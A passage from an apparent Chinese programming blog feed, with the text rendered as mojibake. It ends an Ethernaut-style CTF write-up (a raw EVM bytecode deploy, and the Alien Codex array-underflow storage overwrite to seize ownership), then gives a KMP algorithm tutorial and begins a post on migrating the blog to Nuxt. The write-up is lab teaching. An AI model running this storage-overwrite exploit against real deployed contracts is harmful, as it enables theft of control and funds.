<p>ç¬¬ä¸€æ¬¡<code>push</code>çš„æ˜¯<code>0x0a</code>ï¼Œè¿™æ˜¯runtimeä»£ç çš„é•¿åº¦ï¼Œç¬¬äºŒæ¬¡<code>push</code>çš„æ˜¯<code>0x0c</code>ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬çš„éƒ¨ç½²ä»£ç çš„é•¿åº¦æ˜¯12ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å°†<code>runtime</code>ä»£ç é™„åœ¨éƒ¨ç½²ä»£ç åé¢ï¼Œåˆ™<code>runtime</code>ä»£ç çš„åç§»é‡æ˜¯<code>0x0c</code>ï¼Œç¬¬ä¸‰æ¬¡<code>push</code>çš„æ˜¯<code>0x00</code>ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æ‰“ç®—å°†æˆ‘ä»¬çš„<code>runtime</code>ä»£ç ä¿å­˜åˆ°å†…å­˜<code>memory</code>çš„<code>slot 0</code>å¤„ã€‚æœ€åæ˜¯å°†<code>memory</code>çš„ç©ºé—´æ‰©å±•åˆ°<code>len=0x0a</code>(å¦‚æœä¹‹å‰ä¸è¶³çš„è¯) å¹¶è¿”å›éƒ¨ç½²åçš„å­—èŠ‚ç .æœ€ç»ˆçš„æ±‡ç¼–å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åç§»    æ±‡ç¼–æŒ‡ä»¤å¯¹åº”äºŒè¿›åˆ¶ï¼ˆ16è¿›åˆ¶ï¼‰å®é™…æ±‡ç¼–æŒ‡ä»¤</span><br><span class="line">0000    600a            	PUSH1 0x0a</span><br><span class="line">0002    600c            	PUSH1 0x0c</span><br><span class="line">0004    6000            	PUSH1 0x00</span><br><span class="line">0006    39              	CODECOPY</span><br><span class="line">0007    600a            	PUSH1 0x0a</span><br><span class="line">0009    6000            	PUSH1 0x00</span><br><span class="line">000B    F3              	RETURN</span><br><span class="line">000C    602a                 PUSH1 0x2a</span><br><span class="line">000E    6050                 PUSH1 0x50</span><br><span class="line">0010    52                   mstore</span><br><span class="line">0011    6020                 PUSH1 0x20</span><br><span class="line">0013    6050                 PUSH1 0x50</span><br><span class="line">0015    F3                   RETURN</span><br></pre></td></tr></table></figure>

<p>å³<code>600a600c600039600a6000F3602a60505260206050F3</code>æ˜¯æˆ‘ä»¬è¦éƒ¨ç½²çš„å†…å®¹ã€‚</p>
<p>æˆ‘ä»¬åœ¨æ§åˆ¶å°è¾“å…¥ä¸€ä¸‹ä»£ç å³å¯ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">byteCode = <span class="string">"600a600c600039600a6000F3602a60505260206050F3"</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">data</span>: byteCode&#125;)</span><br><span class="line"><span class="comment">// å°†ä¼šè¿”å›contractåœ°å€ï¼Œå‡è®¾ä¸º0x01</span></span><br><span class="line"><span class="keyword">await</span> contract.setSolver(<span class="string">'0x01'</span>)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæäº¤å³å¯ã€‚</p>
<h2 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;helpers&#x2F;Ownable-05.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact &#x3D; true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">    codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] &#x3D; _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šè·å¾—åˆçº¦æ‰€æœ‰æƒã€‚</p>
<p>ä¹ä¸€çœ‹ä¸Šå»ï¼Œæ²¡æœ‰ä¿®æ”¹åˆçº¦æ‰€æœ‰æƒçš„å‡½æ•°ï¼Œå®é™…ä¸Šï¼Œè¯¥åˆçº¦ç»§æ‰¿äº†<code>Ownable</code>åˆçº¦ï¼Œè¯¥åˆçº¦å¯ä»¥<a href="https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol" target="_blank" rel="noopener">ã€æ­¤ã€‘</a>æŸ¥çœ‹ï¼Œå®é™…ä¸Šï¼Œå°±ç®—æˆ‘ä»¬ä¸æŸ¥çœ‹è¯¥åˆçº¦ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¾æ¬¡åœ¨æ§åˆ¶å°è¾“å…¥ä¸€ä¸‹ä»£ç ï¼ŒæŸ¥çœ‹ç›¸å…³å­˜å‚¨å¸ƒå±€ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"0"</span>)</span><br><span class="line"><span class="keyword">await</span> contract.make_contact()</span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"0"</span>)</span><br></pre></td></tr></table></figure>

<p>å°±ä¼šå‘ç°ï¼Œå®é™…ä¸Šè¯¥åˆçº¦çš„å­˜å‚¨ç»“æ„ä¸­ï¼Œç¬¬ä¸€ä¸ª<code>slot</code>çš„å¸ƒå±€å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">|      unused(11)      |contact(1) |        owner (20)       | &lt;- slot 0</span><br><span class="line">--------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>å†æ¬¡æŸ¥çœ‹<code>revise</code>å‡½æ•°ï¼Œæ”¯æŒå†™å…¥<code>codex</code>çš„æŸä¸ªä½ç½®ï¼Œæˆ‘ä»¬è¿˜æ³¨æ„åˆ°<code>retract</code>å‡½æ•°ï¼Œæ˜¯ç›´æ¥å°†åŠ¨æ€é•¿åº¦å‡å»1ï¼Œå®é™…ä¸Š<code>slodity</code>è¿™é‡Œå¹¶æ²¡æœ‰å¯¹åŠ¨æ€æ•°ç»„é•¿åº¦åš<strong>æº¢å‡ºæ£€æŸ¥</strong>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">await contract.retract()</span><br><span class="line">await web3.eth.getStorageAt(instance, &quot;1&quot;)</span><br><span class="line"># return &#39;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>slot 1 å­˜å‚¨çš„æ˜¯åŠ¨æ€æ•°ç»„codexçš„é•¿åº¦ï¼Œå…³äºåŠ¨æ€æ•°ç»„ä¸­å…ƒç´ çš„ä½ç½®ï¼Œå‚ç…§<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">ã€å®˜ç½‘æ–‡æ¡£-çŠ¶æ€å˜é‡åœ¨å‚¨å­˜ä¸­çš„å¸ƒå±€ã€‘</a></p>
</blockquote>
<p>ç”±äºæˆ‘ä»¬çš„<code>codex</code>å˜é‡ç›®å‰æ˜¯å’Œ<code>slot 1</code>ç›¸å…³è”ï¼Œè€ŒåŠ¨æ€æ•°ç»„çš„å…ƒç´ å­˜å‚¨ä½ç½®ä¼šä» <code>keccak256(p)</code> å¼€å§‹ï¼Œ<code>p</code>æ˜¯<code>slot index</code>ï¼Œæœ¬å…³å¡æ˜¯1ï¼Œæ­¤å¤–ï¼Œ å®ƒçš„å¸ƒå±€æ–¹å¼ä¸é™æ€å¤§å°çš„æ•°ç»„ç›¸åŒã€‚ä¸€ä¸ªå…ƒç´ æ¥ç€ä¸€ä¸ªå…ƒç´ ã€‚</p>
<p>æˆ‘ä»¬å€ŸåŠ©remixï¼Œå†™ä¸ªè®¡ç®—<code>keccak256</code>çš„å‡½æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract T &#123;</span><br><span class="line">    function keccak256Helper(uint p) public pure returns(bytes32 res) &#123;</span><br><span class="line">        res &#x3D; keccak256(abi.encodePacked(p));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¾—åˆ°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keccak256(1)&#x3D;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br></pre></td></tr></table></figure>

<p>è¯¥åœ°å€å³ä¸º<code>codex</code>ä¸­å…ƒç´ çš„èµ·å§‹åœ°å€</p>
<p>å€ŸåŠ©<code>python</code>ï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—ä¸€ä¸ªåç§»åœ°å€ï¼Œä½¿å¾—åç§»åçš„åœ°å€æŒ‡å‘0ï¼Œå³ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hex(<span class="number">2</span>**<span class="number">256</span> - <span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span>)</span><br><span class="line">             <span class="number">0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è°ƒç”¨<code>revise</code>å‡½æ•°ï¼Œå¹¶å°†åç§»åœ°å€è®¾ç½®æˆä¸Šè¿°åœ°å€ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.revise(<span class="string">'0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'</span>, <span class="string">'0x000000000000000000000000'</span> + player.substr(<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬å¯ä»¥ç¡®è®¤æˆ‘ä»¬å·²ç»æˆåŠŸè·å¾—æ‰€æœ‰æƒï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner() == player</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç½‘ç»œæ”»é˜²</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Web3.0</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸²çš„æ¨¡å¼åŒ¹é…ç®—æ³•ä¹‹KMPç®—æ³•</title>
    <url>/2020/11/27/%E4%B8%B2%E7%9A%84%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95%E4%B9%8BKMP%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>å­ä¸²çš„å®šä½æ“ä½œé€šå¸¸ç§°åšä¸²çš„<strong>æ¨¡å¼åŒ¹é…</strong>ï¼Œæ˜¯å„ç§ä¸²å¤„ç†ç³»ç»Ÿä¸­æœ€é‡è¦çš„æ“ä½œä¹‹ä¸€ã€‚</p>
<p>æ¨¡å¼ä¸²<code>T</code>: å­ä¸²</p>
<p>ä¸»ä¸²<code>S</code>ï¼šæºä¸²</p>
<h2 id="æš´åŠ›æ³•"><a href="#æš´åŠ›æ³•" class="headerlink" title="æš´åŠ›æ³•"></a>æš´åŠ›æ³•</h2><p>æœ€å®¹æ˜“æƒ³åˆ°çš„å°±æ˜¯åˆ©ç”¨å›æº¯çš„æ€æƒ³è¿›è¡Œæš´åŠ›æ±‚è§£ï¼š<a id="more"></a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// O(n*m)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getIndex</span><span class="params">(<span class="keyword">char</span> *S, <span class="keyword">char</span> *T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, SLength = <span class="built_in">strlen</span>(S), TLength = <span class="built_in">strlen</span>(T);</span><br><span class="line">    <span class="keyword">while</span> (i &lt; SLength &amp;&amp; j &lt; TLength) &#123;</span><br><span class="line">        <span class="keyword">if</span> (S[i] == T[j]) &#123;</span><br><span class="line">            i++, j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// å›æº¯æŒ‡é’ˆ</span></span><br><span class="line">            i = i - j + <span class="number">1</span>;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j &gt;= TLength) <span class="keyword">return</span> i - TLength;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä¸è¶³ä¹‹å¤„åœ¨äºæ¯æ¬¡é‡åˆ°ä¸åŒ¹é…çš„æ—¶å€™ï¼ŒæŒ‡é’ˆæ€»æ˜¯å›æº¯åˆ°ä¸Šæ¬¡çš„èµ·ç‚¹çš„ä¸‹ä¸€ä¸ªä½ç½®ï¼Œä¾‹å¦‚ä¸‹é¢çš„æƒ…å†µ(<code>S=ababcabcacbab</code>   <code>T=abcac</code>)ï¼Œ<code>i=6, j =4</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">S:a b a b c a b c a c b a b</span><br><span class="line">T:    a b c a c</span><br></pre></td></tr></table></figure>

<p>æŒ‰ç…§æš´åŠ›æ³•ï¼Œä¸‹æ¬¡<code>i=i - j + 1=3, j =0</code>ï¼Œä½†æ˜¯æˆ‘ä»¬ç»è¿‡æ€è€ƒï¼Œå‘ç°æ¨¡å¼ä¸²çš„ä¸‹æ ‡ä¸º<code>0</code>çš„å…ƒç´ æ˜¯å’Œä¸‹æ ‡ä¸º<code>3</code>çš„å…ƒç´ æ˜¯ç›¸åŒçš„ï¼Œé‚£æˆ‘ä»¬å¾€åå°è¯•åŒ¹é…çš„è¿‡ç¨‹ä¸­ï¼Œåªè¦æœªæˆåŠŸï¼Œå°±ä¸€å®šä¼šå‡ºç°ä¸‹é¢çš„æƒ…å†µï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">S:a b a b c a b c a c b a b</span><br><span class="line">T:          a b c a c</span><br></pre></td></tr></table></figure>

<p>é‚£æˆ‘ä»¬å®Œå…¨å¯ä»¥ä¸åŒæ—¶å›æº¯æŒ‡é’ˆ<code>i</code>å’Œ<code>j</code>ï¼Œç›´æ¥å°†æ¨¡å¼ä¸²å¾€åç§»åŠ¨<code>3</code>ä¸ªå•ä½è¿›è¡ŒåŒ¹é…</p>
<p>åˆ©ç”¨è¿™ç§â€œéƒ¨åˆ†åŒ¹é…â€çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é‡åˆ°ä¸åŒ¹é…çš„æ—¶å€™ï¼Œä¸å°†æŒ‡é’ˆ<code>i</code>å›æº¯ï¼Œè€Œæ˜¯å°½é‡å°†æ¨¡å¼ä¸²å¾€å³â€œæ»‘åŠ¨â€ç‰¹å®šå•ä½é•¿åº¦è¿›è¡Œç»§ç»­åŒ¹é…ã€‚</p>
<p>å…³é”®æ˜¯ç§»åŠ¨çš„é•¿åº¦è¯¥å¦‚ä½•æ±‚è§£ï¼Ÿ</p>
<h2 id="KMPç®—æ³•"><a href="#KMPç®—æ³•" class="headerlink" title="KMPç®—æ³•"></a>KMPç®—æ³•</h2><p>è¯¥ç®—æ³•ç”±<code>D.E.Knuth</code>å’Œ<code>V.R.Pratt</code>å’Œ<code>J.H.Morris</code>åŒæ—¶å‘ç°çš„ï¼Œäººä»¬ç§°ä¹‹ä¸ºå…‹åŠªç‰¹-è«æ–¯é‡Œ-æ™®æ‹‰ç‰¹æ“ä½œï¼Œç®€ç§°<code>KMP</code>ç®—æ³•ã€‚è¯¥ç®—æ³•èƒ½å°†æ—¶é—´å¤æ‚åº¦é™åˆ°<code>O(n+m)</code></p>
<p>è¯¥ç®—æ³•å…³é”®åœ¨äºæ±‚è§£<code>next[]</code>ï¼Œè‹¥ä»¤<code>next[i]=j</code>ï¼Œåˆ™è¡¨ç¤ºæ¨¡å¼ä¸²ä¸­ç¬¬<code>i</code>ä¸ªå­—ç¬¦ä¸ä¸»ä¸²ä¸­ç›¸å¯¹åº”å­—ç¬¦ä¸åŒ¹é…çš„æ—¶å€™ï¼Œåœ¨æ¨¡å¼ä¸²ä¸­éœ€è¦é‡æ–°å’Œä¸»ä¸²ä¸­è¯¥å­—ç¬¦è¿›è¡Œæ¯”è¾ƒçš„å­—ç¬¦çš„ä½ç½®ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getNext</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">int</span> *next)</span> </span>&#123;</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>, length = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line">        j = next[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; str[j] != str[i]) &#123;</span><br><span class="line">            j = next[j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == str[j]) &#123;</span><br><span class="line">            next[i] = j + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            next[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KMP</span><span class="params">(<span class="keyword">char</span> *S, <span class="keyword">char</span> *T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> next[MAXLEN];</span><br><span class="line">    getNext(T, next);</span><br><span class="line">    <span class="keyword">int</span> SLength = <span class="built_in">strlen</span>(S), TLength = <span class="built_in">strlen</span>(T);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; SLength; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; S[i] != T[j]) &#123;</span><br><span class="line">            j = next[j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (S[i] == T[j]) &#123;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j == TLength) &#123;</span><br><span class="line">            <span class="keyword">return</span> i - j + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>å­—ç¬¦ä¸²</tag>
        <tag>KMP</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨Nuxtæ”¹é€ åšå®¢å‰ç«¯</title>
    <url>/2022/05/07/%E4%BD%BF%E7%94%A8Nuxt%E6%94%B9%E9%80%A0%E5%8D%9A%E5%AE%A2%E5%89%8D%E7%AB%AF/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ˜¯çš„ï¼Œæ²¡é”™ï¼Œæˆ‘åˆæ¥å¯¹æˆ‘çš„åšå®¢ç³»ç»Ÿä¸‹æ‰‹äº†ï¼å›æƒ³èµ·2020å¹´ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨<a href="https://hexo.io/zh-cn/index.html" target="_blank" rel="noopener">hexo</a>æ­å»ºçš„é™æ€åšå®¢ï¼Œé‚£æ˜¯æˆ‘å¯¹åšå®¢ç³»ç»Ÿçš„åˆä½“éªŒï¼Œå½“æ—¶æ­å»ºå®Œæ¯•åï¼Œåˆ°å¤„æ‰¾æ’ä»¶ï¼Œæ‰¾ä¸»é¢˜ï¼Œå¿ƒæƒ…ä¹Ÿå¾ˆæ¿€åŠ¨ï¼Œå› ä¸ºè¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ªç½‘ç«™ï¼Œå½“æ—¶ç†¬å¤œæ­å»ºç½‘ç«™çš„æ¿€åŠ¨ç°åœ¨ä»ç„¶å¯ä»¥ä½“ä¼šå¾—åˆ°ï¼</p>
<a id="more"></a>

<p>åæ¥æ…¢æ…¢åœ°æ¥è§¦åˆ°äº†åŠ¨æ€åšå®¢çš„æ¦‚å¿µï¼Œè¿›ä¸€æ­¥äº†è§£åˆ°äº†<a href="http://typecho.org/" target="_blank" rel="noopener">typecho</a>ï¼Œä¸ºäº†æ­å»ºå®ƒï¼Œæˆ‘è‡ªå·±å¼€å§‹ç§Ÿå€ŸæœåŠ¡å™¨ï¼Œå¼€å¯äº†ç©è½¬æœåŠ¡å™¨ä¹‹æ—…ã€‚</p>
<p>ä½¿ç”¨äº†<code>typecho</code>å¤§æ¦‚åŠå¹´ä»¥åï¼Œé€æ¸æ„Ÿå—åˆ°è®¸å¤šä¸ä¾¿ï¼Œç‰¹åˆ«æ˜¯è¯¥åšå®¢ä½¿ç”¨çš„æ˜¯<code>PHP</code>è¯­è¨€å¼€å‘çš„ï¼Œæˆ‘æ²¡æœ‰æ¥è§¦è¿‡ï¼Œä¹Ÿæš‚æ—¶ä¸æƒ³æ¥è§¦ï¼Œæƒ³è¦å®ç°æŸäº›è‡ªå®šä¹‰åŠŸèƒ½çš„æ—¶å€™ï¼Œæ— ä»ä¸‹æ‰‹ã€‚</p>
<p>äºæ˜¯ï¼Œå‡ºäºç¨‹åºå‘˜çš„ç†å¿µï¼š</p>
<blockquote>
<p>å½“ä½ è§‰å¾—æŸä¸ªä¸œè¥¿ä¸å¥½ç”¨çš„æ—¶å€™ï¼Œé‚£ä½ å°±è‡ªå·±é€ å®ƒã€‚</p>
</blockquote>
<p>æˆ‘å†³å®šè‡ªå·±å¼€å¹²ï¼è‡ªå·±ç¼–å†™ä¸€ä¸ªåšå®¢ç³»ç»Ÿï¼</p>
<p>å£å·å–Šå¾—è™½ç„¶å¾ˆå“ï¼Œä½†æ˜¯æ¿€æƒ…è¿‡åå°±æ˜¯æ— å°½çš„è¿·èŒ«ï¼Œè‡ªå·±æ ¹æœ¬æ— ä»ä¸‹æ‰‹ï¼Œä½†æ˜¯è‡ªå·±ç«‹ä¸‹çš„èª“è¨€å«æ³ªä¹Ÿè¦å®Œæˆå§ï¼ç„¶åè‡ªå·±åœ¨åœ¨ç½‘ä¸Šæ‰¾äº†å¾ˆå¤šæ­å»ºåšå®¢çš„æ•™ç¨‹ï¼Œä½†æ˜¯è¦ä¹ˆå°±æ˜¯æ²¡æœ‰æ–‡æ¡£ï¼Œè¦ä¹ˆå°±æ˜¯å°±ç»™äº†æˆªå›¾ï¼Œæºç éƒ½ä¸æä¾›ã€‚ä¸è¿‡æˆ‘ä¹Ÿèƒ½ç†è§£ï¼Œå‡ ä¹æ²¡æœ‰äººæ„¿æ„å°†ä»é›¶æ­å»ºåšå®¢çš„è¿‡ç¨‹å…¨éƒ½è®°å½•ä¸‹æ¥å§ï¼Œé‚£æ ·å­å¤ªè´¹æ—¶é—´äº†ã€‚</p>
<p>ç›´åˆ°åæ¥ï¼Œåœ¨å“”å“©å“”å“©ä¸Šé¢æ‰¾åˆ°äº†æä»å¯†è€å¸ˆçš„<a href="https://www.bilibili.com/video/BV13t411T72J" target="_blank" rel="noopener">å°è€Œç¾çš„åšå®¢</a>æ•™ç¨‹ï¼Œä¸Šé¢è¯¦ç»†ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨<code>SpringBoot</code>æ­å»ºä¸ªäººåšå®¢ï¼Œç„¶åæˆ‘å°±è·Ÿç€ä½œè€…ä¸€è¡Œä¸€è¡Œåœ°æ•²ä»£ç ï¼Œä¸è¿‡åˆ°åé¢æˆ‘é€æ¸æ˜ç™½äº†æ€ä¹ˆæ­å»ºä»¥åï¼Œæœ‰ä¸€äº›ä»£ç å°±è·Ÿä½œè€…ä¸ä¸€æ ·äº†ï¼Œä¸è¿‡<code>90%</code>å·¦å³çš„ä»£ç è¿˜æ˜¯å’Œä½œè€…ä¸€æ ·çš„ã€‚</p>
<p>æ—¶é—´æ¥åˆ°äº†21å¹´å¹´åˆï¼Œæˆ‘åˆå¼€å§‹æ¥è§¦åˆ°äº†å‰åç«¯åˆ†ç¦»çš„æ¦‚å¿µï¼Œè§‰å¾—è¿™ç©æ„æŒºæ–°å¥‡çš„ï¼Œæˆ‘å°±èŒå‘äº†æ”¹é€ åšå®¢çš„æƒ³æ³•ï¼Œä¸è¿‡è¦æ”¹çš„è¯ï¼Œè¦æ”¹çš„åœ°æ–¹æœ‰å¾ˆå¤šï¼Œä¸»è¦æ˜¯æ¶‰åŠå‰ç«¯é¡µé¢çš„éƒ½è¦é‡æ–°åšï¼Œä½†æ˜¯æˆ‘çš„å®¡ç¾ä¸€ç›´ä¸åœ¨çº¿ï¼Œæœ€åè®¾è®¡å‡ºæ¥çš„é¡µé¢å·®å¼ºäººæ„ã€‚ç„¶åå‰ç«¯ä½¿ç”¨<code>Vue</code>å’Œ<code>Element-UI</code>,åç«¯ä¹‹å‰æ ¹æ®æä»å¯†è€å¸ˆçš„æ•™ç¨‹ï¼ŒæŒä¹…å±‚ä½¿ç”¨çš„æ˜¯<code>Hibernate</code>,ç„¶åæˆ‘è¿™æ¬¡ä½¿ç”¨çš„æ˜¯<code>Mybatis</code>,å…¶ä»–çš„æ€æƒ³æ²¿ç”¨ä¹‹å‰çš„æƒ³æ³•ã€‚ä¸è¿‡æ”¹å®Œä»¥åï¼Œæœ‰ä¸€ä¸ªè‡´å‘½çš„å¼±ç‚¹ï¼Œé‚£å°±æ˜¯é¦–é¡µè®¿é—®é€Ÿåº¦è´¼æ…¢ï¼è€Œä¸”å¦‚æœæˆ‘ä»¬å°è¯•åœ¨æµè§ˆå™¨ä¸­æŸ¥çœ‹æºç ï¼Œæˆ‘ä»¬è·å–åˆ°çš„å°±æ˜¯åªæœ‰ä¸€å †<code>js</code>æ–‡ä»¶ï¼Œè¿™æ ·å­å°±éå¸¸ä¸åˆ©äºæœç´¢å¼•æ“ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä¸å°†æˆ‘çš„åšå®¢é“¾æ¥å‘å‡ºå»ï¼Œé‚£ä¹ˆå°±å‡ ä¹ä¸å¯èƒ½æœ‰äººæ‰¾å¾—åˆ°æˆ‘çš„åšå®¢ã€‚æˆ‘åŸæœ¬å†™åšå®¢å°±æ˜¯ä¸ºäº†æƒ³åˆ†äº«ä¸€ä¸‹è‡ªå·±çš„å­¦ä¹ å¿ƒå¾—ï¼Œæˆ–è€…å’Œå…¶ä»–äººä¸€èµ·äº¤æµï¼Œæ”¹é€ åšå®¢ä»¥åæœç´¢å¼•æ“éƒ½ä¸æ¥æˆ‘è¿™äº†ï¼Œè¿™å°±è¿èƒŒäº†æˆ‘çš„åˆè¡·ï¼Œè¿™ä¹Ÿä¸ºæˆ‘åé¢æ”¹é€ åšå®¢åŸ‹ä¸‹ä¼ç¬”ã€‚</p>
<h2 id="æ”¹é€ ä¹‹è·¯"><a href="#æ”¹é€ ä¹‹è·¯" class="headerlink" title="æ”¹é€ ä¹‹è·¯"></a>æ”¹é€ ä¹‹è·¯</h2><p>ç»è¿‡ä¸€å¹´çš„ä½¿ç”¨åï¼Œæˆ‘æ¸æ¸è§‰å¾—åšå®¢ç³»ç»Ÿè¿˜æ˜¯éœ€è¦ä¸€å®šçš„è®¿é—®é‡ï¼Œä¸ç„¶ä¸å¥½æ„æ€è¯´æ˜¯åšå®¢ç³»ç»Ÿï¼Œç„¶åæˆ‘å°±æ¯”å¯¹äº†ä¸€ä¸‹<code>Vue</code>é¡¹ç›®è¿›è¡ŒæœåŠ¡ç«¯æ¸²æŸ“çš„æ–¹æ¡ˆï¼Œæœ€ç»ˆé€‰å®šä½¿ç”¨<code>Nuxt</code>æ”¹é€ ã€‚</p>
